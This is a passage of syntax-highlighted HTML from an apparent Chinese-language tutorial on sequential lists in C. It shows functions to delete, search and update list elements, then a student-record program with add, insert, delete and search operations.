punctuation\">)</span><span class=\"token punctuation\">&#123;</span>\n\t\t<span class=\"token function\">printf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"删除位置不合法\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\t<span class=\"token punctuation\">&#125;</span>\n\t<span class=\"token keyword\">for</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">int</span> i<span class=\"token operator\">=</span>add<span class=\"token punctuation\">;</span>i<span class=\"token operator\">&lt;</span>t<span class=\"token punctuation\">.</span>length<span class=\"token punctuation\">;</span>i<span class=\"token operator\">++</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span><span class=\"token comment\">//将删除位置后的元素前移</span>\n\t\tt<span class=\"token punctuation\">.</span>head<span class=\"token punctuation\">[</span>i<span class=\"token operator\">-</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span><span class=\"token operator\">=</span>t<span class=\"token punctuation\">.</span>head<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n\t<span class=\"token punctuation\">&#125;</span>\n\tt<span class=\"token punctuation\">.</span>length<span class=\"token operator\">--</span><span class=\"token punctuation\">;</span><span class=\"token comment\">//顺序表长度减1</span>\n\t<span class=\"token keyword\">return</span> t<span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">&#125;</span>\n\ntable <span class=\"token function\">selecttable</span><span class=\"token punctuation\">(</span>table t<span class=\"token punctuation\">,</span><span class=\"token keyword\">int</span> data<span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span><span class=\"token comment\">//查找函数，data为查找元素 </span>\n\t<span class=\"token keyword\">int</span> i<span class=\"token punctuation\">;</span>\n\t<span class=\"token keyword\">for</span><span class=\"token punctuation\">(</span>i<span class=\"token operator\">=</span><span class=\"token number\">0</span><span class=\"token punctuation\">;</span>i<span class=\"token operator\">&lt;</span>t<span class=\"token punctuation\">.</span>length<span class=\"token punctuation\">;</span>i<span class=\"token operator\">++</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span>\n\t\t<span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span>t<span class=\"token punctuation\">.</span>head<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">]</span><span class=\"token operator\">==</span>data<span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span>\n\t\t\t<span class=\"token function\">printf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"查找成功，该元素位置为%d\"</span><span class=\"token punctuation\">,</span>i<span class=\"token operator\">+</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\t\t\t<span class=\"token keyword\">break</span><span class=\"token punctuation\">;</span>\n\t\t<span class=\"token punctuation\">&#125;</span>\n\t<span class=\"token punctuation\">&#125;</span>\n\t<span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span>i<span class=\"token operator\">==</span>t<span class=\"token punctuation\">.</span>length<span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span>\n\t\t<span class=\"token function\">printf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"查找失败\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\t<span class=\"token punctuation\">&#125;</span>\n\t<span class=\"token keyword\">return</span> t<span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">&#125;</span>\n\ntable <span class=\"token function\">updatetable</span><span class=\"token punctuation\">(</span>table t<span class=\"token punctuation\">,</span><span class=\"token keyword\">int</span> data<span class=\"token punctuation\">,</span><span class=\"token keyword\">int</span> newdata<span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span><span class=\"token comment\">//修改函数，data为修改元素，newdata为修改后的元素 </span>\n\t<span class=\"token keyword\">int</span> i<span class=\"token punctuation\">;</span>\n\t<span class=\"token keyword\">for</span><span class=\"token punctuation\">(</span>i<span class=\"token operator\">=</span><span class=\"token number\">0</span><span class=\"token punctuation\">;</span>i<span class=\"token operator\">&lt;</span>t<span class=\"token punctuation\">.</span>length<span class=\"token punctuation\">;</span>i<span class=\"token operator\">++</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span>\n\t\t<span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span>t<span class=\"token punctuation\">.</span>head<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">]</span><span class=\"token operator\">==</span>data<span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span>\n\t\t\tt<span class=\"token punctuation\">.</span>head<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">]</span><span class=\"token operator\">=</span>newdata<span class=\"token punctuation\">;</span>\n\t\t\t<span class=\"token function\">printf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"修改成功\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\t\t\t<span class=\"token keyword\">break</span><span class=\"token punctuation\">;</span>\n\t\t<span class=\"token punctuation\">&#125;</span>\n\t<span class=\"token punctuation\">&#125;</span>\n\t<span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span>i<span class=\"token operator\">==</span>t<span class=\"token punctuation\">.</span>length<span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span>\n\t\t<span class=\"token function\">printf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"修改失败\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\t<span class=\"token punctuation\">&#125;</span>\n\t<span class=\"token keyword\">return</span> t<span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">&#125;</span>\n\n<span class=\"token keyword\">int</span> <span class=\"token function\">main</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span> \n\ttable t<span class=\"token operator\">=</span><span class=\"token function\">initTable</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\t<span class=\"token keyword\">for</span> <span class=\"token punctuation\">(</span><span class=\"token keyword\">int</span> i<span class=\"token operator\">=</span><span class=\"token number\">1</span><span class=\"token punctuation\">;</span> i<span class=\"token operator\">&lt;=</span>Size<span class=\"token punctuation\">;</span> i<span class=\"token operator\">++</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n        t<span class=\"token punctuation\">.</span>head<span class=\"token punctuation\">[</span>i<span class=\"token operator\">-</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span><span class=\"token operator\">=</span>i<span class=\"token punctuation\">;</span>\n        t<span class=\"token punctuation\">.</span>length<span class=\"token operator\">++</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">&#125;</span>\n    <span class=\"token function\">dispaly</span><span class=\"token punctuation\">(</span>t<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\t<span class=\"token keyword\">return</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">&#125;</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<h3 id=\"创建一个学生信息的顺序表\"><a href=\"#创建一个学生信息的顺序表\" class=\"headerlink\" title=\"创建一个学生信息的顺序表\"></a>创建一个学生信息的顺序表</h3><pre class=\"line-numbers language-c\" data-language=\"c\"><code class=\"language-c\"><span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">include</span><span class=\"token string\">&lt;stdio.h></span></span>\n<span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">include</span><span class=\"token string\">&lt;stdlib.h></span></span>\n<span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">include</span><span class=\"token string\">&lt;string.h></span></span>\n\n<span class=\"token keyword\">typedef</span> <span class=\"token keyword\">struct</span> <span class=\"token class-name\">Students</span><span class=\"token punctuation\">&#123;</span>\n\t<span class=\"token keyword\">char</span> id<span class=\"token punctuation\">[</span><span class=\"token number\">15</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">//学号 </span>\n\t<span class=\"token keyword\">char</span> name<span class=\"token punctuation\">[</span><span class=\"token number\">20</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">//名字 </span>\n\t<span class=\"token keyword\">int</span> price<span class=\"token punctuation\">;</span> <span class=\"token comment\">//成绩 </span>\n<span class=\"token punctuation\">&#125;</span>student<span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">typedef</span> <span class=\"token keyword\">struct</span> <span class=\"token class-name\">List</span><span class=\"token punctuation\">&#123;</span>\n  \tstudent  <span class=\"token operator\">*</span>elem<span class=\"token punctuation\">;</span>    <span class=\"token comment\">//指向数据元素的基地址</span>\n\t<span class=\"token keyword\">int</span>  length<span class=\"token punctuation\">;</span>      <span class=\"token comment\">//线性表的当前长度</span>\n<span class=\"token punctuation\">&#125;</span>SqlList<span class=\"token punctuation\">;</span>\n\n<span class=\"token keyword\">void</span> <span class=\"token function\">init</span><span class=\"token punctuation\">(</span>SqlList <span class=\"token operator\">&amp;</span>L<span class=\"token punctuation\">,</span><span class=\"token keyword\">int</span> n<span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span>\n\tL<span class=\"token punctuation\">.</span>elem<span class=\"token operator\">=</span><span class=\"token punctuation\">(</span>student <span class=\"token operator\">*</span><span class=\"token punctuation\">)</span><span class=\"token function\">malloc</span><span class=\"token punctuation\">(</span>n<span class=\"token operator\">*</span><span class=\"token keyword\">sizeof</span><span class=\"token punctuation\">(</span>student<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><span class=\"token comment\">//分配n个元素的空间</span>\n\t<span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token operator\">!</span>L<span class=\"token punctuation\">.</span>elem<span class=\"token punctuation\">)</span> <span class=\"token function\">exit</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><span class=\"token comment\">//分配失败</span>\n\t<span class=\"token function\">printf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"初始化成功！当前顺序表的最大长度为%d\\n\"</span><span class=\"token punctuation\">,</span>n<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\tL<span class=\"token punctuation\">.</span>length<span class=\"token operator\">=</span><span class=\"token number\">0</span><span class=\"token punctuation\">;</span><span class=\"token comment\">//初始化长度为0</span>\n<span class=\"token punctuation\">&#125;</span>\n\n<span class=\"token keyword\">void</span> <span class=\"token function\">add</span><span class=\"token punctuation\">(</span>SqlList <span class=\"token operator\">&amp;</span>L<span class=\"token punctuation\">,</span><span class=\"token keyword\">int</span> n<span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span><span class=\"token comment\">//向顺序表中添加n个学生的信息</span>\n\t<span class=\"token keyword\">int</span> i<span class=\"token punctuation\">;</span>\n\t<span class=\"token keyword\">for</span><span class=\"token punctuation\">(</span>i<span class=\"token operator\">=</span><span class=\"token number\">0</span><span class=\"token punctuation\">;</span>i<span class=\"token operator\">&lt;</span>n<span class=\"token punctuation\">;</span>i<span class=\"token operator\">++</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span>\n\t\t<span class=\"token function\">printf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"请输入第%d个学生的学号、姓名、成绩:\\n\"</span><span class=\"token punctuation\">,</span>i<span class=\"token operator\">+</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\t\t<span class=\"token function\">scanf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"%s%s%d\"</span><span class=\"token punctuation\">,</span>L<span class=\"token punctuation\">.</span>elem<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">]</span><span class=\"token punctuation\">.</span>id<span class=\"token punctuation\">,</span>L<span class=\"token punctuation\">.</span>elem<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">]</span><span class=\"token punctuation\">.</span>name<span class=\"token punctuation\">,</span><span class=\"token operator\">&amp;</span>L<span class=\"token punctuation\">.</span>elem<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">]</span><span class=\"token punctuation\">.</span>price<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\t\t<span class=\"token keyword\">while</span><span class=\"token punctuation\">(</span>L<span class=\"token punctuation\">.</span>elem<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">]</span><span class=\"token punctuation\">.</span>price<span class=\"token operator\">&lt;</span><span class=\"token number\">0</span><span class=\"token operator\">||</span>L<span class=\"token punctuation\">.</span>elem<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">]</span><span class=\"token punctuation\">.</span>price<span class=\"token operator\">></span><span class=\"token number\">100</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span>  <span class=\"token comment\">//判断输入的成绩是否合法</span>\n\t\t\t<span class=\"token function\">printf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"成绩输入错误，请重新输入:\\n\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\t\t\t<span class=\"token function\">scanf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"%d\"</span><span class=\"token punctuation\">,</span><span class=\"token operator\">&amp;</span>L<span class=\"token punctuation\">.</span>elem<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">]</span><span class=\"token punctuation\">.</span>price<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><span class=\"token comment\">//重新输入的合法成绩</span>\n\t\t<span class=\"token punctuation\">&#125;</span>\n\t\tL<span class=\"token punctuation\">.</span>length<span class=\"token operator\">++</span><span class=\"token punctuation\">;</span>\n\t<span class=\"token punctuation\">&#125;</span>\n<span class=\"token punctuation\">&#125;</span>\n\n<span class=\"token keyword\">void</span> <span class=\"token function\">print</span><span class=\"token punctuation\">(</span>SqlList <span class=\"token operator\">&amp;</span>L<span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span><span class=\"token comment\">//输出顺序表中的学生信息</span>\n\t<span class=\"token keyword\">int</span> i<span class=\"token punctuation\">;</span>\n\t<span class=\"token function\">printf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"===============================\\n\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\t<span class=\"token function\">printf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"学号\\t姓名\\t成绩\\n\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\t<span class=\"token keyword\">for</span><span class=\"token punctuation\">(</span>i<span class=\"token operator\">=</span><span class=\"token number\">0</span><span class=\"token punctuation\">;</span>i<span class=\"token operator\">&lt;</span>L<span class=\"token punctuation\">.</span>length<span class=\"token punctuation\">;</span>i<span class=\"token operator\">++</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span><span class=\"token comment\">//输出学生信息</span>\n\t\t<span class=\"token function\">printf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"%s\\t%s\\t%d\\n\"</span><span class=\"token punctuation\">,</span>L<span class=\"token punctuation\">.</span>elem<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">]</span><span class=\"token punctuation\">.</span>id<span class=\"token punctuation\">,</span>L<span class=\"token punctuation\">.</span>elem<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">]</span><span class=\"token punctuation\">.</span>name<span class=\"token punctuation\">,</span>L<span class=\"token punctuation\">.</span>elem<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">]</span><span class=\"token punctuation\">.</span>price<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><span class=\"token punctuation\">&#125;</span>\n\t<span class=\"token punctuation\">&#125;</span>\n\n<span class=\"token keyword\">void</span> <span class=\"token function\">search</span><span class=\"token punctuation\">(</span>SqlList <span class=\"token operator\">&amp;</span>L<span class=\"token punctuation\">,</span><span class=\"token keyword\">char</span> <span class=\"token operator\">*</span>name<span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span><span class=\"token comment\">//查找顺序表中的学生信息</span>\n\t<span class=\"token keyword\">int</span> i<span class=\"token punctuation\">;</span>\n\t<span class=\"token keyword\">for</span><span class=\"token punctuation\">(</span>i<span class=\"token operator\">=</span><span class=\"token number\">0</span><span class=\"token punctuation\">;</span>i<span class=\"token operator\">&lt;</span>L<span class=\"token punctuation\">.</span>length<span class=\"token punctuation\">;</span>i<span class=\"token operator\">++</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span>\n\t\t<span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token function\">strcmp</span><span class=\"token punctuation\">(</span>L<span class=\"token punctuation\">.</span>elem<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">]</span><span class=\"token punctuation\">.</span>name<span class=\"token punctuation\">,</span>name<span class=\"token punctuation\">)</span><span class=\"token operator\">==</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span><span class=\"token comment\">//查找到了</span>\n\t\t\t<span class=\"token function\">printf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"学号\\t成绩\\n\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\t\t\t<span class=\"token function\">printf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"%s\\t%d\\n\"</span><span class=\"token punctuation\">,</span>L<span class=\"token punctuation\">.</span>elem<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">]</span><span class=\"token punctuation\">.</span>id<span class=\"token punctuation\">,</span>L<span class=\"token punctuation\">.</span>elem<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">]</span><span class=\"token punctuation\">.</span>price<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\t\t\t<span class=\"token keyword\">break</span><span class=\"token punctuation\">;</span>\n\t\t<span class=\"token punctuation\">&#125;</span>\n\t<span class=\"token punctuation\">&#125;</span>\n\t<span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span>i<span class=\"token operator\">==</span>L<span class=\"token punctuation\">.</span>length<span class=\"token punctuation\">)</span> <span class=\"token function\">printf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"查无此人!\\n\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">&#125;</span>\n\n<span class=\"token keyword\">void</span> <span class=\"token function\">search1</span><span class=\"token punctuation\">(</span>SqlList <span class=\"token operator\">&amp;</span>L<span class=\"token punctuation\">,</span><span class=\"token keyword\">int</span> rank<span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span><span class=\"token comment\">//查找顺序表中指定位置的学生信息</span>\n\t<span class=\"token function\">printf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"学号\\t姓名\\t成绩\\n\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\t<span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span>rank<span class=\"token operator\">&lt;</span><span class=\"token number\">1</span><span class=\"token operator\">||</span>rank<span class=\"token operator\">></span>L<span class=\"token punctuation\">.</span>length<span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span>\n\t\t<span class=\"token function\">printf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"输入的位次有误！\\n\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\t\t<span class=\"token function\">printf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"表中数据个数为%d\"</span><span class=\"token punctuation\">,</span>L<span class=\"token punctuation\">.</span>length<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\t\t<span class=\"token punctuation\">&#125;</span>\n\t<span class=\"token keyword\">else</span><span class=\"token punctuation\">&#123;</span>\n\t\t<span class=\"token function\">printf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"%s\\t%s\\t%d\\n\"</span><span class=\"token punctuation\">,</span>L<span class=\"token punctuation\">.</span>elem<span class=\"token punctuation\">[</span>rank<span class=\"token operator\">-</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">.</span>id<span class=\"token punctuation\">,</span>L<span class=\"token punctuation\">.</span>elem<span class=\"token punctuation\">[</span>rank<span class=\"token operator\">-</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">.</span>name<span class=\"token punctuation\">,</span>L<span class=\"token punctuation\">.</span>elem<span class=\"token punctuation\">[</span>rank<span class=\"token operator\">-</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">.</span>price<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\t<span class=\"token punctuation\">&#125;</span>\n<span class=\"token punctuation\">&#125;</span>\n\n<span class=\"token keyword\">void</span> <span class=\"token function\">insert</span><span class=\"token punctuation\">(</span>SqlList <span class=\"token operator\">&amp;</span>L<span class=\"token punctuation\">,</span><span class=\"token keyword\">int</span> rank<span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span><span class=\"token comment\">//在顺序表中指定位置插入学生信息</span>\n\t<span class=\"token keyword\">int</span> i<span class=\"token punctuation\">;</span>\n\t<span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span>rank<span class=\"token operator\">&lt;</span><span class=\"token number\">1</span><span class=\"token operator\">||</span>rank<span class=\"token operator\">></span>L<span class=\"token punctuation\">.</span>length<span class=\"token operator\">+</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span>\n\t\t<span class=\"token function\">printf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"输入的位次有误！\\n\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\t<span class=\"token punctuation\">&#125;</span>\n\t<span class=\"token keyword\">else</span><span class=\"token punctuation\">&#123;</span>\n\t\t<span class=\"token keyword\">for</span><span class=\"token punctuation\">(</span>i<span class=\"token operator\">=</span>L<span class=\"token punctuation\">.</span>length<span class=\"token operator\">-</span><span class=\"token number\">1</span><span class=\"token punctuation\">;</span>i<span class=\"token operator\">>=</span>rank<span class=\"token operator\">-</span><span class=\"token number\">1</span><span class=\"token punctuation\">;</span>i<span class=\"token operator\">--</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span>\n\t\t\tL<span class=\"token punctuation\">.</span>elem<span class=\"token punctuation\">[</span>i<span class=\"token operator\">+</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span><span class=\"token operator\">=</span>L<span class=\"token punctuation\">.</span>elem<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n\t\t<span class=\"token punctuation\">&#125;</span>\n\t\t<span class=\"token function\">printf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"请输入要插入的学生的学号、姓名、成绩:\\n\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\t\t<span class=\"token function\">scanf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"%s%s%d\"</span><span class=\"token punctuation\">,</span>L<span class=\"token punctuation\">.</span>elem<span class=\"token punctuation\">[</span>rank<span class=\"token operator\">-</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">.</span>id<span class=\"token punctuation\">,</span>L<span class=\"token punctuation\">.</span>elem<span class=\"token punctuation\">[</span>rank<span class=\"token operator\">-</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">.</span>name<span class=\"token punctuation\">,</span><span class=\"token operator\">&amp;</span>L<span class=\"token punctuation\">.</span>elem<span class=\"token punctuation\">[</span>rank<span class=\"token operator\">-</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">.</span>price<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\t\t<span class=\"token keyword\">while</span><span class=\"token punctuation\">(</span>L<span class=\"token punctuation\">.</span>elem<span class=\"token punctuation\">[</span>rank<span class=\"token operator\">-</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">.</span>price<span class=\"token operator\">&lt;</span><span class=\"token number\">0</span><span class=\"token operator\">||</span>L<span class=\"token punctuation\">.</span>elem<span class=\"token punctuation\">[</span>rank<span class=\"token operator\">-</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">.</span>price<span class=\"token operator\">></span><span class=\"token number\">100</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span>  <span class=\"token comment\">//判断输入的成绩是否合法</span>\n\t\t\t<span class=\"token function\">printf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"成绩输入错误，请重新输入:\\n\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\t\t\t<span class=\"token function\">scanf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"%d\"</span><span class=\"token punctuation\">,</span><span class=\"token operator\">&amp;</span>L<span class=\"token punctuation\">.</span>elem<span class=\"token punctuation\">[</span>rank<span class=\"token operator\">-</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">.</span>price<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><span class=\"token comment\">//重新输入的合法成绩</span>\n\t\t<span class=\"token punctuation\">&#125;</span>\n\t\tL<span class=\"token punctuation\">.</span>length<span class=\"token operator\">++</span><span class=\"token punctuation\">;</span>\n\t<span class=\"token punctuation\">&#125;</span>\n<span class=\"token punctuation\">&#125;</span>\n\n<span class=\"token keyword\">void</span> <span class=\"token function\">del</span><span class=\"token punctuation\">(</span>SqlList <span class=\"token operator\">&amp;</span>L<span class=\"token punctuation\">,</span><span class=\"token keyword\">int</span> rank<span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span><span class=\"token comment\">//删除顺序表中指定位置的学生信息</span>\n\t<span class=\"token keyword\">int</span> i<span class=\"token punctuation\">;</span>\n\t<span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span>rank<span class=\"token operator\">&lt;</span><span class=\"token number\">1</span><span class=\"token operator\">||</span>rank<span class=\"token operator\">></span>L<span class=\"token punctuation\">.</span>length<span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span>\n\t\t<span class=\"token function\">printf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"输入的位次有误！\\n\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\t\t<span class=\"token function\">printf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"删除失败！\\n\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\t<span class=\"token punctuation\">&#125;</span>\n\t<span class=\"token keyword\">else</span><span class=\"token punctuation\">&#123;</span>\n\t\t<span class=\"token keyword\">for</span><span class=\"token punctuation\">(</span>i<span class=\"token operator\">=</span>rank<span class=\"token operator\">-</span><span class=\"token number\">1</span><span class=\"token punctuation\">;</span>i<span class=\"token operator\">&lt;</span>L<span class=\"token punctuation\">.</span>length<span class=\"token operator\">-</span><span class=\"token number\">1</span><span class=\"token punctuation\">;</span>i<span class=\"token operator\">++</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span>\n\t\t\tL<span class=\"token punctuation\">.</span>elem<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">]</span><span class=\"token operator\">=</span>L<span class=\"token punctuation\">.</span>elem<span class=\"token punctuation\">[</span>i<span class=\"token operator\">+</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n\t\t<span class=\"token punctuation\">&#125;</span>\n\t\tL<span class=\"token punctuation\">.</span>length<span class=\"token operator\">--</span><span class=\"token punctuation\">;</span>\n\t<span class=\"token punctuation\">&#125;</span>\n<span class=\"token punctuation\">&#125;</span>\n\n<span class=\"token keyword\">void</span> <span class=\"token function\">statistics</span><span class=\"token punctuation\">(</span>SqlList <span class=\"token operator\">&amp;</span>L<span class=\"token punctuation\">)</span><span class=\"token comment\">//输出顺序表中学生数量</span>\n<span class=\"token punctuation\">&#123;</span>\n\t<span class=\"token function\">printf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"学生数量为：%d\\n\"</span><span class=\"token punctuation\">,</span>L<span class=\"token punctuation\">.</span>length<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">&#125;</span>\n<span class=\"token keyword\">int</span> <span class=\"token function\">main</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span>\n\t<span class=\"token keyword\">int</span> N<span class=\"token punctuation\">;</span>\n\t<span class=\"token function\">printf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"是否初始化顺序表？(y/n)\\n\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\t<span class=\"token keyword\">char</span> ch<span class=\"token punctuation\">;</span>\n\t<span class=\"token 